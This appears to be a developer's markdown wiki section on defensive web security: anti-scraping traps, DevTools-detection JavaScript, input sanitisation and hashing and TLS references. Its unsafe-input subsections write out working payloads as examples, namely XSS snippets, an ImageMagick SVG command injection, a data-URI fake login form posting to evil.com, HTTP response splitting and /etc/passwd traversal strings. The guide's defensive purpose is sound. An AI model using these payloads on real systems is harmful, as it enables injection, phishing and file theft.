		<!-- Require CSS support. Add hidden (display: none) input field and detect if it's filled. -->
		<style>
		/* email h0n3yp07 */
		#test_email{
			display: none;
		}
		</style>
		<input id="real_email" type="email" name="real_email" size="25" value="">
		<input id="test_email" type="email" name="email" size="25" value="">
		<!-- if test_email if filled, the sender have a high probability to trick you -->

	Or add hidden fake entries (for a directory page with list of file). If the link is accessed, there is a high probability it's a scrapper. What append if the trigger link is discovered and inserted in ads / others websites (to trigger false positive)... by using rotation (detect only in some periode of time)?
	
	Use instead quota or slowdown or auto logout (and reduce timeout/quantity each time) mechanisms to prevent scrapping. Display a message to allow the user to contact you directy, by email or phone in case it's really legit.

	- add fake data, aka "copyright trap", "paper town". [Fictitious entry — Wikipedia](https://en.wikipedia.org/wiki/Fictitious_entry) Ex: for map data provider add fake town, etc. [Agloe, New York — Wikipedia](https://en.wikipedia.org/wiki/Agloe,_New_York)
	- [html - How do I prevent site scraping? - Stack Overflow](https://stackoverflow.com/questions/3161548/how-do-i-prevent-site-scraping/3161695#3161695)
	- [Fictitious entry — Wikipedia](https://en.wikipedia.org/wiki/Fictitious_entry)
	- [Publisher under fire for fake article webpages : Nature News & Comment](http://www.nature.com/news/publisher-under-fire-for-fake-article-webpages-1.20154)
	- Crawlers and scrappers https://github.com/JayBizzle/Crawler-Detect
	- [The Web's Largest Community Tracking Online Fraud & Abuse | Project Honey Pot](http://www.projecthoneypot.org/)
- include archive or image bomb but not used as is (attack). Ex: use it raw data as key for encryption. See [Exploits](Compression#exploits)
	- [10 GB in a 27 KB Gzip File \[My Present To HTTP Scanners\] -](https://rehmann.co/blog/10-gb-27-kb-gzip-file-present-http-scanners/)
- detect physically impossible for one human to react below some timespan or to move quicker than some speed or repeat too much times similar action (flood). Ex. nobody could send 100 reviews in few days (specially if the reviews are more than 100 chars)
	Use statistics (point cloud, graphs, threshold, etc.) and compare with the average people. Ex: ingame real people can't always aim perfectly (perfect angles values)
- [Copyright infringement](Conception#copyright-infringement)
- use counter-measure against side-channel leaks based on time (timing attack):
	See [Timing attack](#timing-attack)

For contexts where code/data is given to untrusted parties (games, webapp, downloaded native app):

- [Hide data](#hide-data)
- encrypted files (code) use param provided by the preloader. If the default value is used instead, the app run in a standalone mode: someone try to hack it (track IP + all infos)
- Always force a fresh download of preloaders (dynamically generated?)
- no hard code keys, tokens and IDs in source code
- remove debug symbols
- save value snapshots at random time interval
- check memory alteration. Never store a numeric or a string of the result / score. Use pointer, etc.
- use intergrity checks / DRM: [Subresource Integrity](#subresource-integrity), native non overwritable class method of VM API, etc.
- detect tools and modifications:

		// See [795547 - Detecting deveoper tools open status kinda againis your princibles - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=795547#c8)
		// See [799791 - DevTools can be detected using redefined nodeType getter - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=799791#c3)
		Object.defineProperty(new Image()/*document.createElement("any")*/, "nodeType", {
			get: function() {
				// web tools are active (Chrome)
				return 1;
			}
		});
	
		var minimalUserResponseInMiliseconds = 100;
		var before = Date.now();
		debugger;
		if (Date.now() - before > minimalUserResponseInMiliseconds) {
			// user had to resume the script manually via opened dev tools
		}
	
		// Detects if DevTools are open
		// (assuming that user has caching disabled when DevTools are open which is common)
		// works in all major browsers

		// some cachable resource to check
		const resource = 'https://code.jquery.com/jquery-3.2.1.slim.min.js';
		// skip first check
		let first = true;

		setInterval(() => {
			const start = Date.now();
			fetch(resource).then(() => {
				if (first) {
					first = false;
					return;
				}
				if (Date.now() - start >= 10) { // resource is not cached
					// No cache in dev tools is active
				}
			});
		}, 1000);
	
		var baseline_measurements = [];
		var measurements = 20;
		var warmup_runs = 3;
		
		const status = document.documentElement.appendChild(document.createTextNode("DevTools are closed"));
		const junk = document.documentElement.insertBefore(document.createElement("div"), document.body);
		junk.style.display = "none";
		const junk_filler = new Array(1000).join("junk");
		const fill_junk = () => {
			var i = 10000;
			while (i--) {
				junk.appendChild(document.createTextNode(junk_filler));
			}
		};
		const measure = () => {
			if (measurements) {
				const baseline_start = performance.now();
				fill_junk();
				baseline_measurements.push(performance.now() - baseline_start);
				junk.textContent = "";
				measurements--;
				setTimeout(measure, 0);
			} else {
				baseline_measurements = baseline_measurements.slice(warmup_runs); // exclude unoptimized runs
				const baseline = baseline_measurements.reduce((sum, el) => sum + el, 0) / baseline_measurements.length;
			
				setInterval(() => {
					// In actual usage you would also check document.hasFocus()
					// as background tabs are throttled and get false positives
					const start = performance.now();
					fill_junk();
					const time = performance.now() - start;
					status.data = "DevTools are " + (time > 1.77 * baseline ? "open" : "closed");
					junk.textContent = "";
				}, 1000);
			}
		};
		
		setTimeout(measure, 200);
	
		var threshold = 160;
		setInterval(function () {
				var widthThreshold = window.outerWidth - window.innerWidth > threshold;
				var heightThreshold = window.outerHeight - window.innerHeight > threshold;
				
				if (!(heightThreshold && widthThreshold) && ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
					// devtools is opened
				} else {
					// devtools is closed (or undocked, or a sidebar is opened)
				}
		}, 500);
	
	- [DevTools Undocked · Issue #15 · sindresorhus/devtools-detect · GitHub](https://github.com/sindresorhus/devtools-detect/issues/15#issuecomment-215908435)
	- [sindresorhus/devtools-detect: Detect if DevTools is open and its orientation](https://github.com/sindresorhus/devtools-detect)

Automated systems are not perfect, humans too

> A good approach would be to white-list non-infringing sources
— [Warner Brothers reports own site as illegal - BBC News](http://www.bbc.com/news/technology-37275603), [Warner Bros. flags own site for piracy, orders Google to censor pages | Ars Technica](http://arstechnica.com/tech-policy/2016/09/warner-bros-flags-own-site-for-piracy-dmca-google/)

- [Interview d'un vendeur de cheat et enquête auprès des développeurs de jeux vidéo](http://www.nofrag.com/2016/mai/28/49198/)
- [Securing a Flash game’s variables using flash_proxy | Kinsman Games](https://kinsmangames.wordpress.com/2010/04/08/securing-a-flash-games-variables-using-flash_proxy/)
- [actionscript 3 - What is the best way to stop people hacking the PHP-based highscore table of a Flash game - Stack Overflow](https://stackoverflow.com/questions/73947/what-is-the-best-way-to-stop-people-hacking-the-php-based-highscore-table-of-a-f)
- [DVIA (Damn Vulnerable iOS App) - A vulnerable iOS app for pentesting](http://damnvulnerableiosapp.com/)
- [Cheating in online games — Wikipedia](https://en.wikipedia.org/wiki/Cheating_in_online_games)
- [Cheating in Video Games » Feross.org](http://feross.org/cheating-in-video-games/)
- [Sécurité par l'obscurité](http://fr.wikipedia.org/wiki/S%C3%A9curit%C3%A9_par_l%27obscurit%C3%A9)
- [Security through obscurity - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Security_through_obscurity)
- [Flash Player Security Advanced Walkthrough | jpauclair](https://jpauclair.net/2009/12/11/flash-player-security-advanced-walkthrough/)
- [How to protect flash games](how_to_protect_flash_games.pdf)

See also [Hacking](#hacking)

#### Third party data

It's unsafe data. You need to handle care and isolate it.

**Never rely the data comes from outside your application (user inputs, front application messages, thrid party server messages).**
Clean it depends it usage. Ex.: when send a mail, remove all "\n\r" of all header fields

- don't use native deserialization. Use XML, JSON or [Query string](https://en.wikipedia.org/wiki/Query_string) formats. [Deserialization of untrusted data - OWASP](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [escape character](https://en.wikipedia.org/wiki/Escape_character)
- `intval($input)`
- `filter_var($input, FILTER_VALIDATE_EMAIL)`
- [Data Validation « WordPress Codex](https://codex.wordpress.org/Data_Validation)
- use dedicated domain for hosting third party documents/resources (image, HTML, CSS, JS). For proxing, etc.
- [minimaxir/big-list-of-naughty-strings: The Big List of Naughty Strings is a list of strings which have a high probability of causing issues when used as user-input data.](https://github.com/minimaxir/big-list-of-naughty-strings)
- [The Hitchhiker's Guide to SQL Injection prevention](https://phpdelusions.net/sql_injection)
- text, URL, link, 2D/3D data can contains offencive (insult, nudity, obscenity, etc.) text, scene, symbol, gesture, etc. in an image, 3D object, points on a map, ASCII text image
	**Text: Don't think you can manage the problem with just a blacklist of words** (what about lookalike, slang, backward-slang?)
	Forbidden/profanity words domains: Politic, racism, religious, sex, insults, drogs, weight (related to food industry), competing/rival companies...
	
	> If it can be killed, people will kill it. If it can't be killed, people will try and may succeed. If it can be destroyed, it will always be broken. If it can be moved, people will draw dongs or write obscenities with it.
	
	See [User generated content problems](Conception#User generated content problems)

	- [Scunthorpe problem — Wikipedia](https://en.wikipedia.org/wiki/Scunthorpe_problem)
	- [Text transform](Text#Text transform)
	- [shortened URLs](https://en.wikipedia.org/wiki/URL_shortening#Shortcomings)
	- [Slip Me Some Skin - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/479-Slip-Me-Some-Skin.html) - Problems with skin-detection algorithms
	- [SwiftOnSecurity on Twitter: "YouTube comments are now in color, apparently https://t.co/lCtNI76L6u"](https://twitter.com/SwiftOnSecurity/status/772643289434509312) - Draw swastika with ascii art (here with colored [Block Element](https://en.wikipedia.org/wiki/Block_Elements))
	- [Erik D Aker on Twitter: "Thi guy sped by me on the freeway. Had a strong feeling thi wa a Unicode codepoint. In my gut I knew what it was. https://t.co/4B3oHSXXAi"](https://twitter.com/erewok/status/699788390166695936) - Licence plate with then unicode representation U+1F595, see 🖕, [The finger - Wikipedia](https://en.wikipedia.org/wiki/The_finger)
	- [ASCII art - Wikipedia](https://en.wikipedia.org/wiki/ASCII_art)
	- [All the dirty word from Google' "what do you love" project: http://www.wdyl.com/](https://gist.github.com/jamiew/1112488)
	- [Support for multiple language by wagoid · Pull Request #6 · KanoComputing/nodejs-profanity-util](https://github.com/KanoComputing/nodejs-profanity-util/pull/6/files) - Multilanguages swearwords
	- [Seven dirty word - Wikipedia](https://en.wikipedia.org/wiki/Seven_dirty_words)
	- [Category:English swear word - Wiktionary](https://en.wiktionary.org/wiki/Category:English_swear_words)
	- [Megan Spoopy Fox on Twitter: "Funny story - we were asked to make dong detection software for LEGO Universe too. We found it to be utterly impossible at any scale."](https://twitter.com/glassbottommeg/status/604407061380640768)
- clipboard data
	* [Copy & Pest - A case-study on the clipboard, blind trust and invisibl…](http://www.slideshare.net/x00mario/copypest)
- CSS
	* [Scriptless Attacks - Stealing the Pie without touching the Sill](http://www.slideshare.net/x00mario/stealing-the-pie/)
- [JavaScript - Unsafe HTML](JavaScript#unsafe-html)

Always store data from third party in an external folder, outside root of the web server, and use `open_basedir` to protect against local inclusion

See also

- [Vulnerabilities](#vulnerabilities)
- [Safe String Theory for the Web — Acko.net](http://acko.net/blog/safe-string-theory-for-the-web/)

##### Unsafe HTML

- **Do not decode with `s.replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&#39;/g, "'").replace(/&quot;/g, '"')`** https://github.com/WebReflection/html-escaper#why https://github.com/WebReflection/html-escaper/blob/master/html.js https://github.com/mathiasbynens/he
- **Note: All browsers don't support the same syntax** [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC) see [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)
- [Detergent.io](https://detergent.io/) and [codsen/detergent: The text cleaner/encoder for web and email development](https://github.com/codsen/detergent)
- `<noscript><noscript></noscript><script>confirm(1)</script></noscript>`
- `htmlspecialchars()` or (`htmlentities()`). `'<a href="' . htmlspecialchars($url) . '">Link</>'` You can use `ENT_QUOTES` as flag to escape simple quotes. And you should check the protocol of `$url` before.
	`<form name="test" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post">` else `http://example.com/form.php?d=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo%22`
	
	- [Using PHP_SELF in the action field of a form](http://www.html-form-guide.com/php-form/php-form-action-self.html)
- Escape JSON in HTML
	* In element's attribute
		`<div data-test="<?php echo htmlspecialchars(json_encode($data, JSON_HEX_TAG | JSON_UNESCAPED_SLASHES)) ?>">`
	* In `<script type="application/json">`, in `<script>` (where type will be `application/javascript`, and use `JSON_PARTIAL_OUTPUT_ON_ERROR`) or any other element
		`echo 'var data = ' . json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_UNESCAPED_SLASHES);`
	
	* [php - Is json_encode Sufficient XSS Protection? - Stack Overflow](https://stackoverflow.com/questions/12062146/is-json-encode-sufficient-xss-protection)
	* [php - Why does JSON encoder adds escaping character when encoding URLs? - Stack Overflow](https://stackoverflow.com/questions/3723243/why-does-json-encoder-adds-escaping-character-when-encoding-urls)
- `esc_attr($value)`

##### Unsafe chars

- [Unicode Security Guide](http://websec.github.io/unicode-security-guide/)
- can contains special chars and emoji: `éà}`, etc. Ex: emoji in bank account nickname broke banking system https://twitter.com/ajlobster/status/735240869859753985
- [Glitchr ‮ (@glitchr_) / Twitter](https://mobile.twitter.com/glitchr_)

##### Unsafe URI

- `http://evil.com/@good.com` the domain is not `good.com`
- `http://good.com%2f@evil.com/` the domain is not `good.com`
- `https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf` (redirect to `evil.swf`) redirection (account login, etc.) don't know if the trusted target, has been compromized (or allow this kind of redirection)
- `http://good.com%0a%0a%0aTrust%20me.%20It%27s%20totally%20legit.%09%09%09%09%09%0a%0a%0a%0a%0a%0a%0a%0a@evil.com/` is a valid URL, but could be displayed in browser URL bar (or link hover) as `http://good.com`
- `http://x%0aContent-Length%3a99%0a%0a.victim.website/1` and `http://victim.website%00.attacker.website/evil.html` (null char wrongly used to break the domain as `victim.website`). See [Webkit URLs](https://alf.nu/WebkitURLs)
- `xn--wkd-8cdx9d7hbd.org` is not equal to `wіkіpеdіа.org`, but look the same in browser address bar It's a valid [IDN](https://en.wikipedia.org/wiki/Internationalized_domain_name#ASCII_spoofing_concerns) which use [punycode](https://en.wikipedia.org/wiki/Punycode) encoding
- on `http://good.com` URL `//evil.com` the domain is `evil.com`
- filter out data URIs:
	* `data:text/html;charset=UTF-8,https://good.com/some/long/path/follwed/by/html/<html><body><form action=http://evil.com><button>Fake re-login form</button></form></body></html>`
	* `data:text/html;charset=UTF-8,alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}`
	Retect to parameter `http://victim.com/?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`
	https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)
- filter out file URIs. If you get its content (like PHP `file_get_contents()`): `file:///etc/passwd`
	* [If your code accepts URIs as input..](https://blog.steve.fi/If_your_code_accepts_URIs_as_input__.html)
- `http://e­x­a­m­p­l­e­.­com` is not `http://example.com` (use SHY - U+00AD chars)
	> Soft hyphens have been used to obscure malicious domains or URLs in e-mail spam.
	[Soft hyphen — Wikipedia](https://en.wikipedia.org/wiki/Soft_hyphen#Security_issues)
	
	Many browsers ignore SHY chars in URL. That means `http://e­x­a­m­p­l­e­.­com` will be interpreted as `http://example.com`
- Some chars in file path are not supported on Windows: [Git for Windows accidentally creates NTFS alternate data streams](http://latkin.org/blog/2016/07/20/git-for-windows-accidentally-creates-ntfs-alternate-data-streams/) with char `:` in filename
- `urlencode()` and `rawurlencode()` for URLs `$url = 'http://localhost/' . rawurlencode($page) . '?foo=' . urlencode($foo) . '&bar=' . urlencode($bar)`. The same with `encodeURI()`, `encodeURIComponent()`
	See also [`http_build_query()`](http://php.net/manual/en/function.http-build-query.php) and [`parse_url()`](http://docs.php.net/manual/en/function.parse-url.php)
- `snprintf(&s, 0x80u, "texts/%s.json", ".////////////////////////////////////////////////////////////////////////////////////////../../../../../etc/passwd")` overflow the 128 byte string value
- `http://localhost`, `http://0`

##### Unsafe HTTP headers

- `$_SERVER['HTTP_HOST']` contains value defined by the `Host:` header.
- `$_SERVER['SERVER_NAME']` can contains the value defined by the `Host:` header.
	Unless [UseCanonicalName](http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname) (for Apache) is set or name-based virtual hosts are used (but still the case for the default site / default server).
	- [php - HTTP_HOST vs. SERVER_NAME - Stack Overflow](https://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421)
	- [apache - PHP $_SERVER\['HTTP_HOST'\] vs. $_SERVER\['SERVER_NAME'\], am I understanding the man pages correctly? - Stack Overflow](https://stackoverflow.com/questions/1459739/php-serverhttp-host-vs-serverserver-name-am-i-understanding-the-ma/1461430#comment1309905_1460201)
	- [CommonMisconfigurations - Httpd Wiki](https://wiki.apache.org/httpd/CommonMisconfigurations#Not_setting_a_ServerName_in_a_virtual_host.)
	- [How nginx processes a request](http://nginx.org/en/docs/http/request_processing.html#how_to_prevent_undefined_server_names)
	- [server-configs-nginx/no-default at master · h5bp/server-configs-nginx](https://github.com/h5bp/server-configs-nginx/blob/master/sites-available/no-default)
	 
		# Ngnix
		# no default server
		# prevent host header attacks, or other potential problems when an unknown servername is used in a request, drop the request
		server {
			listen 80 default_server;
			return 444;
		}
- HTTP Cache poisoning using Host header: `Host: evilsite.com#`
	* [15KB Of Fame: HTTP Cache Poisoning via Host Header Injection](http://carlos.bueno.org/2008/06/host-header-injection.html)
	* [Skeleton Scribe: Practical HTTP Host header attacks](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)
	* [HTTP HOST header attacks](http://www.slideshare.net/DefconRussia/http-host-header-attacks)
	
	See also [Cache Poisoning - OWASP](https://www.owasp.org/index.php/Cache_Poisoning)
- take care of HTTP headers especially `Host`, `Origin`, `Referer`, etc. Don't trust `User-Agent`. Clean value in returned `Location`, `Set-Cookie` (escape them)

##### Unsafe filename

For filename see also [Unsafe URI](#unsafe-uri) and [Unsafe name](#unsafe-name)

- filename, remove path separators `/` and ignore `.` and `..` (ex: `../../etc/passwd`, `folder/../../../etc/passwd`) or use something like `in_array(array_diff(scandir($directory), array('..', '.')), $filename)` to compare
- check filename of uploaded files. Some lib (like ImageMagick) use patterns to treat files: `*`, `@`, `#`, `|`, `` `: [File Handling -- IM v6 Examples](http://www.imagemagick.org/Usage/files/)
	example, an uploaded SVG handled server side by ImageMagick: `<svg><image xlink:href="|echo Hello > hello.txt; cat /usr/lib/firefox/browser/icons/mozicon128.png"></image></svg>`
	* [CVE-2016-5118 : The OpenBlob function in blob.c in GraphicsMagick before 1.3.24 and ImageMagick allows remote attackers to execute arbit](http://www.cvedetails.com/cve/CVE-2016-5118/)
	* [oss-sec: CVE Request: GraphicsMagick and ImageMagick popen() shell vulnerability via filename](http://seclists.org/oss-sec/2016/q2/432)
- remove any special chars

##### Unsafe files content

From upload and loaded files / data

See [Unsafe filename](#unsafe-filename)

- check upload file type with magic number:
	* [Remote code execution vulnerability in ImageMagick | Hacker News](https://news.ycombinator.com/item?id=11624056)
	* List of blacklisted types by MediaWiki [Manual talk:$wgMimeTypeBlacklist - MediaWiki](https://www.mediawiki.org/wiki/Manual_talk:$wgMimeTypeBlacklist#Default_changed_in_1.17)
	* [HTML/SVG/XML vulnerabilities](#htmlsvgxml-vulnerabilities)
- check upload file content:
	- [Secure user uploads and exploiting served user content](https://opensourcehacker.com/2013/07/31/secure-user-uploads-and-exploiting-served-user-content/)
	- [exploit - How should I serve untrusted / unsanitized documents (PDF, DOC, XLS) to end users over the web? - Information Security Stack Exchange](http://security.stackexchange.com/questions/11995/how-should-i-serve-untrusted-unsanitized-documents-pdf-doc-xls-to-end-user)
	- [Unrestricted File Upload - OWASP](https://www.owasp.org/index.php/Unrestricted_File_Upload)
	- [Assembla security exploit: session take over – Medium](https://medium.com/@yvoschaap/assembla-security-exploit-session-take-over-fca6697c095a#.2ukp7skia)
- A simple file/image can be used to attack using an out of bounds memory write
- image metadata can contains XSS scripts
	- [EXIF Cross Site Scripting, PHP Fun – Confessions Of A Dangerous Mind](http://www.sectorix.com/2013/12/02/exif-cross-site-scripting-php-fun/)
	- [Malware Hidden Inside JPG EXIF Headers](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)
- A simple archive or an image (PNG) can act as a bomb:
	- [Deflate Decompression Bomb](Deflate#Decompression Bomb)
	- [ZIP Decompression Bomb](ZIP#Decompression Bomb)
	- [PNG Decompression Bomb](PNG#Decompression Bomb)
	- [JPEG Bomb](JPEG#Decompression Bomb)
	- [Tarbomb](Tar#Tarbomb)
	
	Workaround: define size or max memory limits (`width * height > max_pixels_limit`)

##### Unsafe name

Name for: username, page name, application name, etc.

Remove diacritics, [normalize](http://www.unicode.org/reports/tr15/), replace [confusables](http://www.unicode.org/Public/security/6.3.0/confusables.txt). See ["use special chars or lookalike chars"](#obfuscation-code))

Don't allow (approve) name change too often

Don't allow famous brand or product (Apple, Google, Amazon, etc.) and lookalike typos Gooogle , Amezon, Facebok, etc.

When users can create an email address `***@domain.ext` with filtering the name like: admin, administrator, mailer-daemon, postmaster, hostmaster or webmaster

Forbid (rewrite) `robots.txt` as username: `domain.ext/username` (use `robots-txt`), `delete` as username `domain.ext/user/delete` (use `delete_username`)

- [Hostname and username to reserve](https://zimbatm.github.io/hostnames-and-usernames-to-reserve/)
- [GitHub i forcing me to change my username, and will not tell me why | Hacker News](https://news.ycombinator.com/item?id=16555451)
- [Microsoft takes 4 years to recover privileged TLS certificate addresses | Ars Technica](http://arstechnica.com/security/2015/03/microsoft-takes-4-years-to-recover-privileged-tls-certificate-addresses/)
- [People's Names That Break Websites | CSS-Tricks](https://css-tricks.com/peoples-names-break-websites/)
- [PSA: Two Different Developers, under the SAME NAME. : Android](https://www.reddit.com/r/Android/comments/7ahujw/psa_two_different_developers_under_the_same_name/)
- [FAQ - Normalization](http://unicode.org/faq/normalization.html)
- [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)

#### Disposable email address

- [Disposable email address - Wikipedia](https://en.wikipedia.org/wiki/Disposable_email_address)
- [The Ultimate Disposable Email Provider List (2017 update)](https://www.ghacks.net/2012/05/31/the-ultimate-disposable-email-provider-list-2012/)
- [List of disposable email provider domains](https://gist.github.com/michenriksen/8710649)
- [A list of domains for disposable and temporary email addresses. Useful for filtering your email list to increase open rates (sending email to these domains likely will not be opened).](https://gist.github.com/adamloving/4401361)
- [Detect temporary mails - Block Disposable Email Addresses - IsTempMail](https://www.istempmail.com/)
- [List of temporary email domains as of 2018-02-06 and disposable email detection, fake user prevention](https://www.block-disposable-email.com/cms/)

#### Hash and keys

**Never make your own cryptography library.**
**Hash: always use salt**

- [How data encryption software creates one way hash files using the sha1 hashing algorithm.](http://www.metamorphosite.com/one-way-hash-encryption-sha1-data-software)
- [Choosing the Right Cryptography Library for your PHP Project: A Guide - Paragon Initiative Enterprises Blog](https://paragonie.com/blog/2015/11/choosing-right-cryptography-library-for-your-php-project-guide)
- [Pure PHP polyfill for ext/sodium](https://github.com/paragonie/sodium_compat) - Polyfill for libsodium in PHP (libsodium is included by default in PHP 7.2)
- as3crypto
	Partial TLS 1.0 support, RSA,  AES, DES, 3DES, BlowFish, XTEA, RC4, MD2, MD5, SHA-1, SHA-224, SHA-256, etc.
	
	- http://code.google.com/p/as3crypto (official repo and issues)
	- https://github.com/timkurvers/as3-crypto (based on as3crypto 1.3)
	- https://github.com/lyokato/as3crypto_patched (based on as3crypto 1.3)
- [Stanford Javascript Crypto Library](https://github.com/bitwiseshiftleft/sjcl)
- [A modern and easy-to-use crypto library. ](https://github.com/jedisct1/libsodium)
- [ActionScript (AS3) library for processing binary data](https://github.com/blooddy/blooddy_crypto)
	MD5, SHA-1, SHA-2 ( SHA-224 и SHA-256 ), Base64, CRC32 algorithms, JSON encoder & decoder as well as PNG and JPEG encoders.
- [hash - SHA512 faster than SHA256? - Cryptography Stack Exchange](http://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256) Works only with implementation using 64-bit integer operations (not JS), see [SHA-512 is 1.5x faster than SHA-256 on 64-bit platforms | Hacker News](https://news.ycombinator.com/item?id=13547042)
- [Length extension attack — Wikipedia](https://en.wikipedia.org/wiki/Length_extension_attack)
- [Lifetimes of cryptographic hash functions](http://valerieaurora.org/hash.html)
- [Looks Like It - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/432-Looks-Like-It.html) and [Kind of Like That - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/529-Kind-of-Like-That.html) - perceptual hashes
- [Comparing -- IM v6 Examples](http://www.imagemagick.org/Usage/compare/#metric_perceptual_hash) - Perceptual Hash
- [Perceptual Hash - ImageMagick](https://www.imagemagick.org/discourse-server/viewtopic.php?t=25061)

Check hash and keys leak or reversed (hashes):

- [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
- [HashKiller.co.uk, Over 1.45387 trillion decrypted hashes in total, Free Hash Cracker, Online Hash Cracker](https://hashkiller.co.uk/)
- [Searches through git repositories for high entropy strings, digging deep into commit history](https://github.com/dxa4481/truffleHog)
- [Collection of github dorks and helper tool to automate the process of checking dorks](https://github.com/techgaun/github-dorks) (search for sensitive data on the repositories)
- [Detect secret leaks in Android Apps](https://android.fallible.co/)

Hash collision:

![PDF Sha1 Collision](Prevent%20violation/Hash%20and%20keys/PDF%20sha1%20collision.jpg)

- [Google Online Security Blog: Announcing the first SHA1 collision](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html) and [SHAttered](https://shattered.it/)
- [sha1collisiondetection](https://github.com/cr-marcstevens/sha1collisiondetection) - Library and command line tool to detect SHA-1 collision in a file
- https://github.com/nneonneo/sha1collider - Build two PDFs that have different content but identical SHA1 sums
- [Nat McHugh: How I created two images with the same MD5 hash](https://natmchugh.blogspot.com/2014/10/how-i-created-two-images-with-same-md5.html)
	and [Nat McHugh: Three way MD5 collision](https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html)
- [Project HashClash - Project HashClash](https://marc-stevens.nl/p/hashclash/)
	- [cr-marcstevens/hashclash: Project HashClash - MD5 & SHA-1 cryptanalysis](https://github.com/cr-marcstevens/hashclash)
	- [hashclash-old-svn-repo/downloads at master · cr-marcstevens/hashclash-old-svn-repo](https://github.com/cr-marcstevens/hashclash-old-svn-repo/tree/master/downloads)
	- [Chosen-prefix Collisions](http://www.win.tue.nl/hashclash/ChosenPrefixCollisions/)
	- [Marc Stevens - Research](https://marc-stevens.nl/research/)

#### Data scraping

- [The ultimate guide on preventing Website Scraping](https://github.com/JonasCz/How-To-Prevent-Scraping)
- [Web scraping — Wikipedia](https://en.wikipedia.org/wiki/Web_scraping)
- [html - How do I prevent site scraping? - Stack Overflow](https://stackoverflow.com/questions/3161548/how-do-i-prevent-site-scraping/34828465#34828465)

See [Web scrapping](Web scrapping)

#### Know your weaknesses

See [Vulnerabilities](#vulnerabilities)

**… and solve it!**

- [Security Tips - Apache HTTP Server Version 2.4](https://httpd.apache.org/docs/2.4/en/misc/security_tips.html)
- [httpd 2.2 vulnerabilities - The Apache HTTP Server Project](https://httpd.apache.org/security/vulnerabilities_22.html)
- [httpd 2.4 vulnerabilities - The Apache HTTP Server Project](https://httpd.apache.org/security/vulnerabilities_24.html)
- https://httpd.apache.org/security/vulnerabilities-httpd.xml

Make [pentest / penetration test](https://en.wikipedia.org/wiki/Penetration_test), create a [bug bounty program](https://en.wikipedia.org/wiki/Bug_bounty_program)

- [Penetration Testing Software | Metasploit](https://www.metasploit.com/)
- [enaqx/awesome-pentest: A collection of awesome penetration testing resources, tools and other shiny things](https://github.com/enaqx/awesome-pentest)

#### Man of the middle

> Why are people surprised that having a service MITM your TLS traffic creates an point of exposure?
— Aaron Beuhring

- HTTPS (TLS), HPKP
- postmessage third part window for validate and generate encypted data (like a client and server), require an extra tab be always opened
- Encrypt data on server too: [Mylar](http://css.csail.mit.edu/mylar/)
- Allow to verify public keys IRL: [Open Whisper Systems >> Blog >> WhatsApp's Signal Protocol integration is now complete](https://www.whispersystems.org/blog/whatsapp-complete/)

It's possible to make calculation on encrypted data using [Homomorphic encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption).

- [Zero-knowledge proof — Wikipedia](https://en.wikipedia.org/wiki/Zero-knowledge_proof)
- [The Netflix Tech Blog: Message Security Layer: A Modern Take on Securing Communication](http://techblog.netflix.com/2014/10/message-security-layer-modern-take-on.html)
- [Message Security Layer](https://github.com/Netflix/msl)

##### Transport Layer Security

Aka TLS

See also [Client Certificate](#client-certificate)

TLS JavaScript Implementation

- [digitalbazaar/forge: A native implementation of TLS in Javascript and tools to write crypto-based and network-heavy webapps](https://github.com/digitalbazaar/forge)
- [A JavaScript Implementation of TLS (Part 1/2) « Digital Bazaar](http://digitalbazaar.com/2010/07/20/javascript-tls-1/) and [A JavaScript Implementation of TLS (Part 2/2) « Digital Bazaar](http://digitalbazaar.com/2010/07/20/javascript-tls-2/)
- [Moxie Marlinspike \>> Software >> sslstrip](https://moxie.org/software/sslstrip/)

**Never mix HTTP and HTTPS, because HTTP parts can be compromised, even in navigation (page 1 HTTP -> page 2 HTTPS, via link, form or redirection).** Use [CSP](#content-security-policy) `block-all-mixed-content` or `upgrade-insecure-requests`.

Note: Root certificate can be compromises (by a malware, by the manufacturer, etc.) on the client machine.

- [Still think you don't need HTTPS?](https://scotthelme.co.uk/still-think-you-dont-need-https/)
- [Transport Layer Security — Wikipedia](https://en.wikipedia.org/wiki/Transport_Layer_Security)
- [Public key cryptography - Diffie-Hellman Key Exchange](Public%20key%20cryptography%20-%20Diffie-Hellman%20Key%20Exchange%20%28full%20version%29%20%28480p%29.mp4)
- [PinPatrol :: Add-ons for Firefox](https://addons.mozilla.org/en-US/firefox/addon/pinpatrol/) shows HSTS and HPKP domains stored by the browser
- [Certificate and Public Key Pinning - OWASP](https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning)
